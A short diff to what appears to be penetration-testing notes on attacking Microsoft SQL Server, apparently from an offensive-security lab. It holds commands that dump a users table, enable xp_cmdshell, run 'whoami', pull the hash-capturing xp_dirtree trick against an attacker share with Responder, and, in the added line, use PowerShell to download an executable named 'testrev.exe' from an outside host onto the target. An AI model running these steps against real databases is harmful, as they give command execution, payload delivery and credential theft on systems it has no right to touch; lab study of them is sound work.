@@ -650,8 +650,10 @@ SELECT * FROM offsec.information_schema.tables;
 select * from offsec.dbo.users;
 
 # try xp_cmdshell
-> xp_cmdshell whoami
 > enable_xp_cmdshell
+> xp_cmdshell whoami
+> xp_cmdshell "powershell IWR -Uri http://10.10.210.147:9900/testrev.exe -outfile C:\temp\testrev.exe"
+
 
 # try xp_dirtree (sudo responder -I tun0 -A)
 > xp_dirtree \\10.10.14.83\share\dir
